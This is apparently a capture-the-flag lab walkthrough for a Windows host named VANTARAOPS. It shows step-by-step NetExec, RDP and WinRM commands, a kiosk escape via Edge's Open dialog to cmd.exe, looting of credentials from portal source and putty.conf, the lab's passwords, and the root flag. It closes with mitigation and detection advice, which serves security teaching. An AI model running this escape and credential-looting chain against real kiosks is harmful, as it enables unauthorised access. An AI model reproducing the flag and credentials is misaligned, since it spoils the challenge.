Edge: Kiosk portal → Edge LOLBIN → PuTTY conf → admin

Target (lab)10.1.194.128 · host VANTARAOPS
OutcomeAdministrator WinRM · root flag on Desktop

Pre-req knowledge

  • Assumed-breach Windows: WinRM, SMB, RDP with NetExec
  • Kiosk apps that force a single shell (TopMost, no Win key)
  • Living-off-the-land: browser “Open file” dialogs can spawn cmd.exe
  • PuTTY session files often store passwords in recoverable form

Core concept (one line)

A locked kiosk is only as strong as every process it is allowed to launch — Edge’s Open dialog is a full file picker, so it is also a shell launcher.

Introduction

Edge starts with assumed-breach credentials for jmorris. The workstation runs a custom Vantara Ops kiosk (VantaraOpsPortal.exe). Escape is not a kernel exploit: read the portal source for a service account, RDP into that kiosk, click Support to open Edge, then use Ctrl+O → type C:\Windows\System32\cmd.exe. From the low-priv shell, loot putty.conf for the admin password.

Root cause

Three operator mistakes stacked: (1) service credentials hardcoded in the portal binary/source, (2) kiosk “help” path opens a full Chromium Edge with file dialogs, (3) admin password left in PuTTY session config under a service profile. Defense-in-depth failed at application design, not at the SAM. 

jmorris (WinRM) → portal source / ACL enum
       → svc_vdi hardcoded password
       → RDP kiosk → Contact Support → Edge
       → Ctrl+O → cmd.exe (LOLBIN)
       → Documents\putty.conf → svc_vdi_mgmt
       → WinRM Administrator → root.txt

Step 1: Map the host and prove jmorris

Why we do this: Confirm SMB/RDP/WinRM and that the handed password still works.
nmap -Pn -n --top-ports 200 -T4 --open 10.1.194.128
nxc smb 10.1.194.128 -u jmorris -p 'Fabricat!on2024' --local-auth
nxc winrm 10.1.194.128 -u jmorris -p 'Fabricat!on2024' --local-auth

What you should see: 135/445/3389 (and WinRM in this lab build). Host VANTARAOPS. Auth success.

Step 2: Enumerate for lateral accounts and portal artifacts

Why we do this: Custom apps under Program Files / ProgramData often hold secrets, ACLs, and alternate identities.
# from WinRM as jmorris
whoami /all
dir C:\Users
# portal source / scripts under Vantara paths (lab layout)
# note svc_backup, svc_vdi, and FullControl hints on VantaraMonitor

Recovered path of interest: portal hardcodes svc_vdi / V@ntara#Ops1. Also see limited svc_backup / P@ssw0rd!.

Step 3: RDP as svc_vdi into the kiosk

Why we do this: The service account is the interactive kiosk user — that is the jail you must escape.
nxc rdp 10.1.194.128 -u svc_vdi -p 'V@ntara#Ops1' --local-auth
# or xfreerdp /v:10.1.194.128 /u:svc_vdi /p:'V@ntara#Ops1' /cert:ignore

What you should see: Full-screen VantaraOpsPortal.exe (TopMost, no normal shell, no easy close).

Step 4: Contact Support → Edge (required click)

Why we do this: The portal’s support path uses Process.Start(URL) to launch Edge. You must click the support control — passive navigation alone may not spawn the browser.

Step 5: Edge LOLBIN — Open dialog to cmd.exe

Why we do this: Chromium’s “Open file” dialog is a standard Win32 file picker. Typing a path to an executable and opening it runs that binary in the user’s context.
In Edge:
  Ctrl+O
  Address / File name:  C:\Windows\System32\cmd.exe
  Open

First principles

  • The kiosk blocked the shell; it did not block child processes of Edge.
  • LOLBIN class: “any UI that can open arbitrary paths can become a launcher.”

Step 6: Loot PuTTY session password

Why we do this: Operators store reusable secrets next to their tools. PuTTY sessions under the service profile held the management admin password.
type C:\Users\svc_vdi.VANTARAOPS\Documents\putty.conf
# Password value for session → svc_vdi_mgmt : 56tyghbn%^TYGHBN

Step 7: Admin WinRM and root flag

Why we do this: Prove local admin and collect the lab flag.
nxc winrm 10.1.194.128 -u svc_vdi_mgmt -p '56tyghbn%^TYGHBN' --local-auth
nxc winrm 10.1.194.128 -u svc_vdi_mgmt -p '56tyghbn%^TYGHBN' --local-auth \
  -x 'type C:\Users\Administrator\Desktop\root.txt'
1ts_N0t_a_BuG_1ts_a_F3atur3

Creds chain (lab)

jmorris / Fabricat!on2024     → WinRM foothold
svc_backup / P@ssw0rd!        → limited SMB
svc_vdi / V@ntara#Ops1        → RDP kiosk + SMB
svc_vdi_mgmt / 56tyghbn%^TYGHBN → admin WinRM/SMB/RDP

Security impact

  • Kiosk escape to interactive command execution
  • Lateral to domain-style local admin via stored tool credentials
  • Full host compromise without a memory-corruption exploit

Mitigation

  • No hardcoded service passwords in portal binaries or config next to the binary.
  • Kiosk: AppLocker / WDAC — allowlist only the portal; block Edge file dialogs or block Edge entirely; use a locked browser profile.
  • Disable or sandbox “help” handlers that call Process.Start on arbitrary URLs.
  • Never store admin passwords in PuTTY sessions on multi-user or kiosk profiles; use LAPS + privileged access workstations.
  • Detect unusual child processes of kiosk/browser (cmd, powershell, regedit).

Beyond Root

Path under the microscope

Alternate PE (replace monitor service binary) may write on disk but fail without rights to stop/start the service. Intended path after shell is credential loot, not service abuse.

Blue team — stop the vuln

  • Treat kiosk accounts as high-risk interactive users: no passwords in Documents, no saved sessions.
  • EDR: alert on msedge.exe → cmd.exe / powershell.exe parent-child chains on kiosk hosts.

Document the engagement

  • Ops: ~/htb/edge/ATTACK_LOG.md, loot/, screenshots/
  • Public: this page on mccleod1290.github.io

Conclusion

Edge is a classic “secure UI, insecure process tree” lesson. Once Edge is in the allow path, the Open dialog is enough. Password archaeology in PuTTY finishes the privilege climb.
